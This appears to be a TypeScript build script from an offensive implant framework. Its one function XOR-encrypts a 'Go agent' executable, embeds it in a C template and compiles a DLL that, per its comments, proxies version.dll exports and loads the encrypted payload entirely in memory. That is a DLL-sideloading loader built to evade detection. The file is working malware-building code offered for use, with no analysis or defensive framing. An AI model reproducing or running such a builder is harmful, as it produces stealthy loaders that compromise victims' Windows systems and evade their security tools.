import { $ } from "bun";
import path from "path";
import fs from "fs";
import crypto from "crypto";

/**
 * Builds a C stub DLL that proxies version.dll exports and loads an
 * encrypted PE payload (the Go agent EXE) entirely in memory.
 *
 * Requires x86_64-w64-mingw32-gcc on PATH (installed in the Docker image).
 */
export async function buildCDllStub(
  /** Path to the plaintext PE payload (Go agent EXE) */
  payloadPath: string,
  /** Where to write the compiled DLL */
  outDllPath: string,
  /** Path to the C template source (version_stub.c) */
  templatePath: string,
  sendToStream: (data: any) => void,
): Promise<void> {
  const payload = fs.readFileSync(payloadPath);

  /* generate a random 32-byte XOR key */
  const key = crypto.randomBytes(32);

  /* encrypt payload */
  const enc = Buffer.alloc(payload.length);
  for (let i = 0; i < payload.length; i++) {
    enc[i] = payload[i] ^ key[i % key.length];
  }

  /* format byte arrays as C literals */
  const fmtBytes = (buf: Buffer) =>
    "{ " + Array.from(buf).map(b => `0x${b.toString(16).padStart(2, "0")}`).join(", ") + " }";

  /* read template and fill placeholders */
  let src = fs.readFileSync(templatePath, "utf8");
  src = src.replace(/%%XOR_KEY%%/g, fmtBytes(key));
  src = src.replace(/%%KEY_LEN%%/g, String(key.length));
  src = src.replace(/%%PAYLOAD%%/g, fmtBytes(enc));
  src = src.replace(/%%PAYLOAD_LEN%%/g, String(enc.length));

  /* write filled source to a temp file */
  const tmpSrc = outDllPath + ".stub.c";
  fs.writeFileSync(tmpSrc, src, "utf8");

  sendToStream({ type: "output", text: `C stub: payload=${payload.length} bytes, encrypted=${enc.length} bytes\n`, level: "info" });
  sendToStream({ type: "output", text: `Compiling C DLL stub...\n`, level: "info" });

  const compiler = "x86_64-w64-mingw32-gcc";
  const proc = $`${compiler} -O2 -shared -o ${outDllPath} ${tmpSrc} -lkernel32 -lntdll -s -fvisibility=hidden -Wall -Wno-unused-parameter`.nothrow();
  let compileOut = "";
  for await (const line of proc.lines()) {
    compileOut += line + "\n";
    if (line.trim()) sendToStream({ type: "output", text: line + "\n", level: "info" });
  }
  const result = await proc;

  /* always clean up temp source */
  try { fs.unlinkSync(tmpSrc); } catch {}

  if (result.exitCode !== 0) {
    throw new Error(`C DLL stub compilation failed (exit ${result.exitCode}):\n${compileOut}`);
  }

  const size = fs.statSync(outDllPath).size;
  sendToStream({ type: "output", text: `C DLL stub ready: ${size} bytes\n`, level: "success" });
}
